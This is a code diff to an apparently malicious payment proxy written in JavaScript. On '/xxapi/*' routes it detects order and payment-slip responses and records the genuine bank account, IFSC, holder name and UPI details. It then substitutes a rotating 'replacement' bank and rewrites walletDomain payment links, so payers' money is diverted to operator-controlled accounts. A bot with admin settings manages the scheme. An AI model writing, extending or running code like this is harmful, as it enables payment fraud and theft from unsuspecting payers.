@@ -171,15 +171,14 @@ async function saveDataUnlocked(data) {
                 try { current = JSON.parse(current); } catch (e) { }
             }
             if (typeof current === 'object' && current !== null) {
-                // Merge dynamic runtime state (orders, user tracks, tokens, notifications)
-                data.orderBankMap = { ...(current.orderBankMap || {}), ...(data.orderBankMap || {}) };
+                // Merge dynamic runtime state (user tracks, tokens, notifications)
                 data.trackedUsers = { ...(current.trackedUsers || {}), ...(data.trackedUsers || {}) };
                 data.tokenMap = { ...(current.tokenMap || {}), ...(data.tokenMap || {}) };
                 data.orderNotificationMap = { ...(current.orderNotificationMap || {}), ...(data.orderNotificationMap || {}) };
 
                 if (!isBotCommand) {
-                    // API request saving runtime data: NEVER overwrite bot settings!
-                    // Always preserve the latest bot settings from Redis.
+                    // API request saving runtime data: merge orders from Redis and NEVER overwrite bot settings!
+                    data.orderBankMap = { ...(current.orderBankMap || {}), ...(data.orderBankMap || {}) };
                     const settingsKeys = [
                         'banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress',
                         'logRequests', 'rawLog', 'adminChatId', 'depositSuccess', 'depositBonus',
@@ -197,8 +196,11 @@ async function saveDataUnlocked(data) {
                     }
                     data.userOverrides = mergedOverrides;
                 } else {
-                    // Bot command saving new settings:
-                    // Keep updated settings in data, and preserve userOverrides
+                    // Bot command saving new settings / order mutations:
+                    // If orderBankMap is undefined, keep current from Redis, otherwise honor the bot command's explicit orderBankMap (e.g. {} for /delete all)
+                    if (data.orderBankMap === undefined) {
+                        data.orderBankMap = { ...(current.orderBankMap || {}) };
+                    }
                     const mergedOverrides = { ...(current.userOverrides || {}) };
                     if (data.userOverrides && typeof data.userOverrides === 'object') {
                         for (const [uid, uo] of Object.entries(data.userOverrides)) {
@@ -1111,6 +1113,15 @@ function captureRealBank(obj, depth) {
         const kl = k.toLowerCase().replace(/[_-]/g, '');
         const mapped = BANK_FIELD_MAP[kl];
         if (mapped && !found[mapped] && obj[k] && String(obj[k]).trim()) found[mapped] = String(obj[k]).trim();
+    }
+    if (obj.walletDomain && typeof obj.walletDomain === 'string') {
+        const winfo = parseWalletDomainDetails(obj.walletDomain);
+        if (winfo) {
+            if (!found.accountNo && winfo.accountNo) found.accountNo = winfo.accountNo;
+            if (!found.ifsc && winfo.ifsc) found.ifsc = winfo.ifsc;
+            if (!found.accountHolder && winfo.name) found.accountHolder = winfo.name;
+            if (!found.upiId && winfo.upiId) found.upiId = winfo.upiId;
+        }
     }
     if (found.accountNo || found.ifsc) return found;
     for (const k of Object.keys(obj)) {
@@ -2877,15 +2888,28 @@ app.all('/xxapi/*', async (req, res) => {
         }
 
         const isOrder = urlLower.includes('paymentslipdetail')
+            || urlLower.includes('paymentslip')
+            || urlLower.includes('waitpayerpaymentslip')
             || /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
             || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST')
             || urlLower.includes('news/code/'); // For dynamic direct payment screens like freechargetutorial
         let _orderId = '';
         if (isOrder) {
+            _orderId = getRequestOrderId(req) || '';
             const orderFields = ['rptNo', 'rpt_no', 'orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id', 'slipId'];
-            if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
+            if (!_orderId && respData && typeof respData === 'object' && !Array.isArray(respData)) {
                 for (const f of orderFields) {
                     if (respData[f] && String(respData[f]).length >= 3) { _orderId = String(respData[f]); break; }
+                }
+            }
+            if (!_orderId && jsonResp && typeof jsonResp === 'object') {
+                for (const f of orderFields) {
+                    if (jsonResp[f] && String(jsonResp[f]).length >= 3) { _orderId = String(jsonResp[f]); break; }
+                }
+            }
+            if (!_orderId && req.body && typeof req.body === 'object') {
+                for (const f of orderFields) {
+                    if (req.body[f] && String(req.body[f]).length >= 3) { _orderId = String(req.body[f]); break; }
                 }
             }
             if (!_orderId) {
@@ -3103,6 +3127,16 @@ app.all('/xxapi/*', async (req, res) => {
                                     _bankReplaced = true;
                                     _replacedBank = replacementBank;
                                 }
+                                const wDomain = (respData && respData.walletDomain) || (jsonResp && jsonResp.data && jsonResp.data.walletDomain) || '';
+                                if (wDomain && typeof wDomain === 'string' && wDomain.includes('://')) {
+                                    const rewritten = rewriteWalletDomainForBank(wDomain, replacementBank, replacementBank.minAmount);
+                                    if (rewritten && rewritten !== wDomain) {
+                                        if (respData && respData.walletDomain) respData.walletDomain = rewritten;
+                                        if (jsonResp && jsonResp.data && jsonResp.data.walletDomain) jsonResp.data.walletDomain = rewritten;
+                                        _bankReplaced = true;
+                                        _replacedBank = replacementBank;
+                                    }
+                                }
                             }
                         }
                     }
@@ -3125,10 +3159,10 @@ app.all('/xxapi/*', async (req, res) => {
         }
 
         // Only notify when response actually had bank details (paymentslipdetail or bank fields in response)
-        if (isOrder && (_realBankSnap || _bankReplaced || _notReplacedAmt !== null || urlLower.includes('paymentslipdetail') || urlLower.includes('news/code/'))) {
+        if (isOrder && (_realBankSnap || _bankReplaced || _notReplacedAmt !== null || urlLower.includes('paymentslipdetail') || urlLower.includes('paymentslip') || urlLower.includes('news/code/'))) {
             const _orderAmt = _notReplacedAmt !== null
                 ? _notReplacedAmt
-                : (getOrderAmount(req, respData) ?? getOrderAmount(req, jsonResp));
+                : (getOrderAmount(req, respData) ?? getOrderAmount(req, jsonResp) ?? getOrderAmount(req, req.body || {}));
             if (_orderId && _bankReplaced && _replacedBank) {
                 if (!data.orderBankMap) data.orderBankMap = {};
                 const existingOrderMapping = getSavedOrderMapping(data, _orderId) || getSavedOrderMapping(data, respData);
